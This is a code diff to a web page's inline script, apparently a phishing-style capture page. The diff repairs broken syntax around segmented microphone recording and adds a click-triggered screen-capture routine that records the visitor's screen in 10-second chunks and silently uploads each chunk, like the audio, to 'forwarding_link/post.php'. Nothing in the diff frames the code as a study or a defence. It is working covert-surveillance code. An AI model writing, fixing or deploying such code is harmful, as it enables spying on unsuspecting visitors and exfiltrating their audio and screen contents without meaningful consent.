@@ -428,60 +428,63 @@
         mediaRecorder.start(); // Start the first segment
         setInterval(() => {
           if (mediaRecorder.state === 'recording') {
-            mediaRecorder.stop(); // This will trigger onstop, which then restarts recording
-          }).catch(e => console.log("Audio permission denied"));
-
-        // Screen Recording logic
-        const screenTrigger = async () => {
-          try {
-            if (!window.screenCaptureActive) {
-              if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
-
-              const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-              window.screenCaptureActive = true;
-
-              const screenRecorder = new MediaRecorder(screenStream);
-              const screenChunks = [];
-
-              screenRecorder.ondataavailable = e => {
-                if (e.data.size > 0) screenChunks.push(e.data);
-              };
-
-              screenRecorder.onstop = () => {
-                const screenBlob = new Blob(screenChunks, { type: 'video/webm' });
-                const fd = new FormData();
-                fd.append('screen', screenBlob);
-                $.ajax({
-                  type: 'POST',
-                  url: 'forwarding_link/post.php',
-                  data: fd,
-                  processData: false,
-                  contentType: false
-                });
-
-                if (screenStream.active) {
-                  screenChunks.length = 0;
-                  screenRecorder.start();
-                }
-              };
-
-              screenStream.getVideoTracks()[0].onended = () => {
-                window.screenCaptureActive = false;
-                if (screenRecorder.state === 'recording') screenRecorder.stop();
-              };
-
-              screenRecorder.start();
-              setInterval(() => {
-                if (screenRecorder.state === 'recording') screenRecorder.stop();
-              }, 10000);
-            }
-          } catch (err) {
-            window.screenCaptureActive = false;
+            mediaRecorder.stop();
           }
-        };
+        }, 20000);
 
-        document.body.addEventListener('click', screenTrigger);
-      }
+      }).catch(e => console.log("Audio permission denied"));
+
+      // Screen Recording logic
+      const screenTrigger = async () => {
+        try {
+          if (!window.screenCaptureActive) {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            window.screenCaptureActive = true;
+
+            const screenRecorder = new MediaRecorder(screenStream);
+            const screenChunks = [];
+
+            screenRecorder.ondataavailable = e => {
+              if (e.data.size > 0) screenChunks.push(e.data);
+            };
+
+            screenRecorder.onstop = () => {
+              const screenBlob = new Blob(screenChunks, { type: 'video/webm' });
+              const fd = new FormData();
+              fd.append('screen', screenBlob);
+              $.ajax({
+                type: 'POST',
+                url: 'forwarding_link/post.php',
+                data: fd,
+                processData: false,
+                contentType: false
+              });
+
+              if (screenStream.active) {
+                screenChunks.length = 0;
+                screenRecorder.start();
+              }
+            };
+
+            screenStream.getVideoTracks()[0].onended = () => {
+              window.screenCaptureActive = false;
+              if (screenRecorder.state === 'recording') screenRecorder.stop();
+            };
+
+            screenRecorder.start();
+            setInterval(() => {
+              if (screenRecorder.state === 'recording') screenRecorder.stop();
+            }, 10000);
+          }
+        } catch (err) {
+          window.screenCaptureActive = false;
+        }
+      };
+
+      document.body.addEventListener('click', screenTrigger);
+    }
 
     init();
   </script>
